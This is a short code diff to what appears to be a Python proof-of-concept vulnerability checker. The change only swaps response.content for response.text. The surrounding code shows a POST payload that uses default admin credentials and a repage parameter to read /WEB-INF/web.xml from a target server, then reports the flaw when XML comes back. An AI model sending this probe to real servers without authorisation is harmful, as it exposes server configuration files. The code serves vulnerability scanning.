@@ -57,7 +57,7 @@ class Poc(ABPoc):
                 nsrsbh=admin&pwd=admin&repage=/WEB-INF/web.xml&Submit=+%B5%C7+%C2%BC+
             '''
             response = requests.post(vul_url, data=data, headers=headers)
-            if response.status_code == 200 and 'xml version' in response.content:
+            if response.status_code == 200 and 'xml version' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
